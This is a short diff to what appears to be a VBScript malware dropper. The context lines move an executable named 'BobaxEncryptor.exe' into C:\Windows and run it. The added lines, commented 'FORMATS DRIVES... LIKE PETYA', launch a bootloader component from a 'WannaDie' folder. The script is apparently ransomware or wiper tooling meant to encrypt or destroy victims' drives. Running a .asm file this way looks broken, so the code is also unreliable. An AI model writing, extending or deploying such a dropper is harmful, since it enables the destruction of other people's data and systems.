@@ -14,3 +14,6 @@ CreateObject("Wscript.Shell").Run """file.bat""", 1, True
 
 FSO.Movefile "BobaxEncryptor.exe","C:\Windows\"
 CreateObject("Wscript.Shell").Run """BobaxEncryptor.exe""", 1, True
+
+'''FORMATS DRIVES... LIKE PETYA
+CreateObject("Wscript.Shell").Run """\WannaDie\bootloader\boot.asm""", 1, True
